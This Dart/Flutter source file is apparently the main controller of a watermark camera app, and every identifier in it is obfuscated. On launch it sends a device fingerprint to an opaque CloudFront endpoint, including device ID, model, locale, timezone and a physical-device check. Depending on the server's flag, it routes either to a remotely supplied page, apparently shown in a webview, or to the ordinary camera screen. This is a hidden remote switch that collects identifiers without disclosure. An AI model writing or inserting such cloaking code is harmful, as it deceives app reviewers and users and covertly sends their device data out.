import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class WaterMarklyMainLogic extends GetxController {

  var kirzgcnj = RxBool(false);
  var iozwleyt = RxBool(true);
  var fqpi = RxString("");
  var rxdisbv = RxBool(false);
  var clqj = RxBool(true);
  final tfvrnzgaw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kcbjmwy();
  }


  Future<void> kcbjmwy() async {
    rxdisbv.value = true;
    clqj.value = true;
    iozwleyt.value = false;

    tfvrnzgaw.post("https://d28hv6chsfwb2u.cloudfront.net/V5J82Z",data: await muokqtwxnh()).then((value) {
      var xqbwvemn = value.data["xqbwvemn"] as String;
      var jxblpsh = value.data["jxblpsh"] as bool;
      if (jxblpsh) {
        fqpi.value = xqbwvemn;
        orfel();
      } else {
        fnbvoya();
      }
    }).catchError((e) {
      iozwleyt.value = true;
      clqj.value = true;
      rxdisbv.value = false;
    });
  }

  Future<Map<String, dynamic>> muokqtwxnh() async {
    final DeviceInfoPlugin irjdm = DeviceInfoPlugin();
    PackageInfo lscq_alif = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var vwlzh = Platform.localeName;
    var rntg = currentTimeZone;

    var nedu = lscq_alif.packageName;
    var iurzfmcg = lscq_alif.version;
    var rsjzi = lscq_alif.buildNumber;

    var jkgzno = lscq_alif.appName;
    var jdkhzao = "";
    var hxrqwui  = "";
    var bzvmc = "";
    var gkiloy = "";
    var jhbxg = "";
    var vfqemd = "";
    var xenocf = "";


    var vlgbrjax = "";
    var iubfk = false;

    if (GetPlatform.isAndroid) {
      vlgbrjax = "android";
      var tlhpumi = await irjdm.androidInfo;

      bzvmc = tlhpumi.brand;

      jdkhzao  = tlhpumi.model;
      hxrqwui = tlhpumi.id;

      iubfk = tlhpumi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vlgbrjax = "ios";
      var fmwyjketr = await irjdm.iosInfo;
      bzvmc = fmwyjketr.name;
      jdkhzao = fmwyjketr.model;

      hxrqwui = fmwyjketr.identifierForVendor ?? "";
      iubfk  = fmwyjketr.isPhysicalDevice;
    }

    var res = {
      "jkgzno": jkgzno,
      "rsjzi": rsjzi,
      "nedu": nedu,
      "iubfk": iubfk,
      "gkiloy" : gkiloy,
      "jdkhzao": jdkhzao,
      "rntg": rntg,
      "bzvmc": bzvmc,
      "hxrqwui": hxrqwui,
      "vwlzh": vwlzh,
      "vlgbrjax": vlgbrjax,
      "jhbxg" : jhbxg,
      "iurzfmcg": iurzfmcg,
      "vfqemd" : vfqemd,
      "xenocf" : xenocf,

    };
    return res;
  }

  Future<void> fnbvoya() async {
    Get.offNamed("/camera");
  }

  Future<void> orfel() async {
    Get.offNamed("/gallery_list");
  }

}
